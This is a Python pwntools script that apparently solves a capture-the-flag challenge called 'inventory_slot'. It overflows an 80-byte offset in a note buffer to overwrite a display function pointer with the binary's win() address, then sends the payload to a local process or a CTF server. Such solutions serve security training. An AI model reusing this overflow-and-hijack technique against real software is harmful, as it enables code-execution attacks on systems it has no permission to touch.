#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./inventory_slot', checksec=False)

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13586)
    return process(elf.path)

p = conn()

OFFSET_TO_DISPLAY = 64+8+8      # bytes from start of `note` to slot->display
WIN               = elf.sym["win"]      # address of win() in the binary

payload = flat(
    b'A' * OFFSET_TO_DISPLAY,
    p64(WIN),
)

p.sendafter(b'content: ', payload)
print(p.recvall(timeout=2).decode(errors='replace'))
